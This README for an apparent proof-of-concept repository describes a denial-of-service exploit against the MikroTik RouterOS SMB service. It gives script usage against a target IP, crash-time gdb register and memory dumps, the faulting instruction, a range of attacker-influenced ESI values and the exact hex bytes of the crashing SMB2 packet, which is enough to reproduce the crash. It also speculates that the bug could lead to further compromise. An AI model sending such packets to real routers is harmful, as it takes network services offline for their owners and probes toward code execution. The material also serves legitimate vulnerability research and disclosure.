# RouterOS-SMB-DOS-POC
This repository contains a working POC for a Denial of Service bug that is found on the SMB service for RouterOS devices ranging from `6.40.5 - 6.44` and `6.48.1 - 6.49.10`.  Only the `x86` arch has been tested.
- **Note: This version range is likely to expand as more testing is done on different device versions and architectures.**
## Overview
- This repository contains POC code for two previously unknown vulnerabilities in the RouterOS SMB service. The poc script called `smb_crash.py` contains both versions of the exploit. The script will prompt the user to enter their target version as seen below.  Due to the similarity and nature of the bug, I chose to include both vulnerabilities in one script 
````
python3 smb_crash.py -t 192.168.15.106 -p 445
[+] What version is the target:
	[1] 6.40.5 - 6.44
	[2] 6.48.1 - 6.49.10
Enter 1 or 2:
-->
````
- Upon executing the script against a vulerable version you will observe the port from going open to closed. For option `1` targets, it is unlikely that the service will reopen, requireing a manual restart from the admin or device owner.  In testing the high version option `2` the kernel will at times restart the service after about 60 seconds, at which time you can utilize the script again.  After sending the DOS condition a second time it was excceedingly rare for the kernel to restart the service a third time.  I am unsure as to why the kernel will sometimes decide to bring the service back up.  I plan to example that further via debugging and reverse engineering.
## Analysis 
- I am quite certain that these two vulnerabilities can be taken further, very possibly resulting in some sort of pwn. However, I was unable to progress them any further. Furthermore, I was unable to find a reliable way to root the `6.49.10` device, thus getting `gdb` attatched to the `smb` process was not successful.
- Due to the plethora of vulnerabilities in the lower RouterOS versions, I was able to attatch `gbd` to the `smb` process and debug the crash condition.
- To root the lower versions I utilized the amazing repo from Tenable found here: https://github.com/tenable/routeros
- By killing the `/nova/bin/smb` process and manually restarting it with `busybox` we can see this output when the `smb_crash.py` script is thrown
````
# /nova/bin/smb
Main start
Socket: created socket: 15, on :139
Socket: created socket: 16, on :445
Socket: created socket: 17, on :137
Socket: created socket: 18, on :138
NBServ: Reg name on ip: 192.168.15.197
NBServ: Reg name on ip: 192.168.88.1
connection from: 192.168.15.172
connection from: 192.168.15.172
died with signal 11 on Sat Feb 17 21:05:51 2024

Segmentation fault
````
- Furthermore when attatching to the process with `gdb` and causing the crash condition we can see these values on the stack
````
(gdb) info reg
eax            0x1f00006e       520093806
ecx            0x8085680        134764160
edx            0xe1000004       -520093692
ebx            0x80851b0        134762928
esp            0x7ffff460       0x7ffff460
ebp            0x7ffff498       0x7ffff498
esi            0xe9085684       -385329532    <-- Way out of the bounds for mapped memory (see below)
edi            0x0      0
eip            0x80616c0        0x80616c0
eflags         0x10212  [ AF IF RF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
````
- Memory mapping 
````
(gdb) info proc mappings
process 2095
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8071000    0x29000        0x0 /nova/bin/smb
         0x8071000  0x8072000     0x1000    0x29000 /nova/bin/smb
         0x8072000  0x8087000    0x15000        0x0 [heap]
        0x77f34000 0x77f69000    0x35000        0x0 /lib/libuClibc-0.9.33.2.so
        0x77f69000 0x77f6a000     0x1000    0x35000 /lib/libuClibc-0.9.33.2.so
        0x77f6a000 0x77f6b000     0x1000    0x36000 /lib/libuClibc-0.9.33.2.so
        0x77f6b000 0x77f6d000     0x2000        0x0
        0x77f6d000 0x77f87000    0x1a000        0x0 /lib/libgcc_s.so.1
        0x77f87000 0x77f88000     0x1000    0x19000 /lib/libgcc_s.so.1
        0x77f88000 0x77f97000     0xf000        0x0 /lib/libuc++.so
        0x77f97000 0x77f98000     0x1000     0xe000 /lib/libuc++.so
        0x77f98000 0x77f9c000     0x4000        0x0 /lib/libucrypto.so
        0x77f9c000 0x77f9d000     0x1000     0x3000 /lib/libucrypto.so
        0x77f9d000 0x77fe8000    0x4b000        0x0 /lib/libumsg.so
        0x77fe8000 0x77fea000     0x2000    0x4a000 /lib/libumsg.so
        0x77fea000 0x77feb000     0x1000        0x0
        0x77feb000 0x77ff3000     0x8000        0x0 /lib/libubox.so
        0x77ff3000 0x77ff4000     0x1000     0x7000 /lib/libubox.so
        0x77ff5000 0x77ff7000     0x2000        0x0
        0x77ff7000 0x77ffe000     0x7000        0x0 /lib/ld-uClibc-0.9.33.2.so
        0x77ffe000 0x77fff000     0x1000     0x6000 /lib/ld-uClibc-0.9.33.2.so
        0x77fff000 0x78000000     0x1000     0x7000 /lib/ld-uClibc-0.9.33.2.so
        0x7ffdf000 0x80000000    0x21000        0x0 [stack]
        0xffffe000 0xfffff000     0x1000        0x0 [vdso]
````
- This is what the `backtrace.log` looked like after the crash
````
/flash/rw/logs/backtrace.log
2024.02.17-17:16:22.17@0: /nova/bin/smb
2024.02.17-17:16:22.17@0: --- signal=11 --------------------------------------------
2024.02.17-17:16:22.17@0:
2024.02.17-17:16:22.17@0: eip=0x080616c0 eflags=0x00010212
2024.02.17-17:16:22.17@0: edi=0x00000000 esi=0xe90862b4 ebp=0x7f9bb118 esp=0x7f9bb0e0
2024.02.17-17:16:22.17@0: eax=0x1f00006e ebx=0x080853f0 ecx=0x080862b0 edx=0xe1000004
2024.02.17-17:16:22.17@0:
2024.02.17-17:16:22.17@0: maps:
2024.02.17-17:16:22.17@0: 08048000-08071000 r-xp 00000000 00:0b 1454       /nova/bin/smb
2024.02.17-17:16:22.17@0: 7770e000-77743000 r-xp 00000000 00:0b 1276       /lib/libuClibc-0.9.33.2.so
2024.02.17-17:16:22.17@0: 77747000-77761000 r-xp 00000000 00:0b 1272       /lib/libgcc_s.so.1
2024.02.17-17:16:22.17@0: 77762000-77771000 r-xp 00000000 00:0b 1256       /lib/libuc++.so
2024.02.17-17:16:22.17@0: 77772000-77776000 r-xp 00000000 00:0b 1260       /lib/libucrypto.so
2024.02.17-17:16:22.17@0: 77777000-777c2000 r-xp 00000000 00:0b 1258       /lib/libumsg.so
2024.02.17-17:16:22.17@0: 777c5000-777cd000 r-xp 00000000 00:0b 1262       /lib/libubox.so
2024.02.17-17:16:22.17@0: 777d1000-777d8000 r-xp 00000000 00:0b 1270       /lib/ld-uClibc-0.9.33.2.so
2024.02.17-17:16:22.17@0:
2024.02.17-17:16:22.17@0: stack: 0x7f9bc000 - 0x7f9bb0e0
2024.02.17-17:16:22.17@0: 00 00 00 00 00 00 00 00 00 00 00 00 f0 53 08 08 9c 62 08 08 00 00 00 00 38 b1 9b 7f bc 60 05 08
2024.02.17-17:16:22.17@0: 04 00 00 00 50 00 00 00 38 b1 9b 7f f0 53 08 08 90 62 08 08 00 00 00 00 48 b1 9b 7f 84 e3 05 08
2024.02.17-17:16:22.17@0:
2024.02.17-17:16:22.17@0: code: 0x80616c0
2024.02.17-17:16:22.17@0: 8b 3e 66 c1 c7 08 c1 c7 10 66 c1 c7 08 81 ff 42
2024.02.17-17:16:22.17@0:
2024.02.17-17:16:22.17@0: backtrace: 0x080616c0 0x0805e384 0x0805e3d4 0x0805e3ad 0x0805e6b2 0x77798c4b 0x77798ca3 0x7779f745 0x0804d827 0x7773cfcb 0x0804d87d
````
## Ghidra 
- Examaning the instuction that causes this crash condition revealed:
````
MOV EDI,dword ptr [ESI]
````
## ESI Control Range
- To confirm we do have some control over `esi` I planned to mutate the packet slightly to see if we could influence the value of `esi` confirming we have some control over the value as the user.  See below for the range of values I was able to generate.
**Note: Only certain bytes of the packets can be altered.  I found that you can edit most `\x00` values that occur after the `SMB2@` value.  More work can certainly be done in this area, I am convinced the range listed below is not fully exaustive.
- Range for ESI
````
esi            0xe9499f9d       -381050979
esi            0xe9499f65       -381051035
esi            0xe9499ead       -381051219
esi            0xe94997c5       -381052987
esi            0xe9085684       -385329532
esi            0xe90856c5       -385329467
esi            0xe9085d6c       -385327764
esi            0xe9085e24       -385327580
esi            0xe9085ee4       -385327388
````
## Packet Bytes in ESI
- On another fresh system with a new `.ova` I wanted to see the explicit packet bytes that ended up in `esi`. After causing the crash condition, I was able to check the value against the packet bytes.  Sure enough there was overlap
````
# cause the crash condition
(gdb) info reg esi
esi            0x80850b4        134762676
(gdb) x/10xb 0x80850b4
0x80850b4:      0xfe    0x53    0x4d    0x42    0x40    0x00    0x00    0x00
0x80850bc:      0x00    0x00
````
- see all registers
````
(gdb) info reg
eax            0x6e     110
ecx            0x8074b80        134695808
edx            0x4      4
ebx            0x8084fb8        134762424
esp            0x7ffff480       0x7ffff480
ebp            0x7ffff4b8       0x7ffff4b8
esi            0x8074b84        134695812
edi            0x0      0
eip            0x80616c0        0x80616c0
eflags         0x212    [ AF IF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
````
- Now examine the packet in order to see if those hex values are in our packet somewhere, `0xfe 0x53 0x4d 0x42...`
- From Wireshark
- `00000000  00 00 00 6e fe 53 4d 42  40 00 00 00 00 00 00 00   ...n.SMB @.......`
- I did spend a fair bit of time in Wireshark examing the packet.  As seen below there is not a huge difference in packets:- packet that is normal and does not crash
````
00000378  00 00 00 72 fe 53 4d 42  40 00 00 00 00 00 00 00   ...r.SMB @.......
00000388  03 00 f1 1f 08 00 00 00  00 00 00 00 03 00 00 00   ........ ........
00000398  00 00 00 00 00 00 00 00  00 00 00 00 05 00 00 00   ........ ........
000003A8  00 00 00 00 eb 7c ea 68  ec c7 10 84 1d f6 8e cc   .....|.h ........
000003B8  ce 89 11 2d 09 00 00 00  48 00 2a 00 5c 00 5c 00   ...-.... H.*.\.\.
000003C8  31 00 39 00 32 00 2e 00  31 00 36 00 38 00 2e 00   1.9.2... 1.6.8...
000003D8  31 00 35 00 2e 00 31 00  39 00 37 00 5c 00 49 00   1.5...1. 9.7.\.I.
000003E8  50 00 43 00 24 00                                  P.C.$.
````
- packet that causes crash
````
00000000  00 00 00 6e fe 53 4d 42  40 00 00 00 00 00 00 00   ...n.SMB @.......
00000010  03 00 f1 1f 08 00 00 00  00 00 00 e1 be 82 00 03   ........ ........
00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 06   ........ ........
00000030  00 00 00 00 00 00 00 47  e5 07 f5 07 ec 01 75 e4   .......G ......u.
00000040  51 5d 9e ea ed 6e a9 09  00 00 00 48 00 26 00 5c   Q]...n.. ...H.&.\
00000050  00 5c 00 31 00 39 00 32  00 2e 00 31 00 36 00 38   .\.1.9.2 ...1.6.8
00000060  00 2e 00 31 00 35 00 2e  00 37 00 37 00 5c 00 70   ...1.5.. .7.7.\.p
00000070  00 75 00 62 00                                     .u.b.
````




  



